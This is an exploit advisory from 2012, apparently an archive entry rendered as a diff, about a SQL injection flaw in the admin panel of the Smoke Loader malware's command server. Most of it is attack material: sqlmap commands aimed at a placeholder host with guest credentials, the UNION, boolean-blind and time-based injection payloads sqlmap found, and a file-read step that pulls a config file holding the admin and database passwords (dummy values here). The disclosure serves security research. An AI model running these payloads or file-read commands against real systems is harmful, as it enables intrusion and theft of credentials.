@@ -1,0 +1,75 @@
+id: 20036
+date: 12/24/2012
+title: Smoke Loader SQL Injection Vulnerability
+author: tohitsugu
+cves: 
+
+Like other http-based exploit kits, I've discovered that the smoke loader malware downloader has a sql injection in its C&C administration panel that can be used to revel the administrator's password.
+
+sqlmap can identify the vulnerable parameter with the string:
+
+root@localhoost:/opt/pentest/database/sqlmap#  ./sqlmap.py -u evilserver.com/directory/guest.php
+--auth-cred=guest:guest --auth-type=basic --dbms mysql --level 3
+--risk 3
+
+
+sqlmap identified the following injection points with a total of 278
+HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+     Type: boolean-based blind
+     Title: MySQL boolean-based blind - WHERE or HAVING clause (RLIKE)
+     Payload: id=1 LIMIT 0,1 UNION ALL SELECT
+NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x3a78746d3a,0x5164707853564955484a,0x3a6a67613a),NULL,NULL,NULL
+RLIKE IF(2984=2984,0x4d7953514c,0x28)
+
+     Type: UNION query
+     Title: MySQL UNION query (NULL) - 13 columns
+     Payload: id=1 LIMIT 0,1 UNION ALL SELECT
+NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x3a78746d3a,0x5164707853564955484a,0x3a6a67613a),NULL,NULL,NULL
+LIMIT 0,1 UNION ALL SELECT
+NULL,NULL,NULL,NULL,NULL,CONCAT(0x3a71616c3a,0x467173496b71686b617a,0x3a7269703a),NULL,NULL,NULL,NULL,NULL#
+
+     Type: AND/OR time-based blind
+     Title: MySQL > 5.0.11 AND time-based blind
+     Payload: id=1 LIMIT 0,1 UNION ALL SELECT
+NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x3a78746d3a,0x5164707853564955484a,0x3a6a67613a),NULL,NULL,NULL
+AND SLEEP(5)
+
+Then:
+
+root@localhoost:/opt/pentest/database/sqlmap#  ./sqlmap.py -u evilserver.com/directory/guest.php
+--auth-cred=guest:guest --auth-type=basic --dbms mysql --level 3 --risk
+3 --file-read=[smoke root directory--can be found by sql errors on guest panel
+by replacing the above parameters with invalid data]/admin/inc/cfg.php
+
+
+root@localhoost:/opt/pentest/database/sqlmap#  cat output/localhost/files/_var_www_smoke_admin_inc_cfg.php
+<?php
+
+$config["admin"] = "bla";                //admin login name
+$config["pass"] = "blabla";                //admin password
+
+$config["guest"] = "guest";                //admin login name
+$config["gpass"] = "guest";                //admin password
+
+$config["dbhost"] = "localhost";
+$config["dbname"] = "smoke";                //mysql database name
+$config["dbuser"] = "bla";                //mysql database username
+$config["dbpass"] = "meh";            //mysql databse password
+
+$config["interval"] = 600;                //interval for check online bots
+
+$OS = array
+(
+     0 => "Windows XP",
+     1 => "Windows 2003",
+     2 => "Windows Vista",
+     3 => "Windows 7",
+     4 => "Other"
+);
+
+?>
+
+#  0day.today [2023-03-24]  #
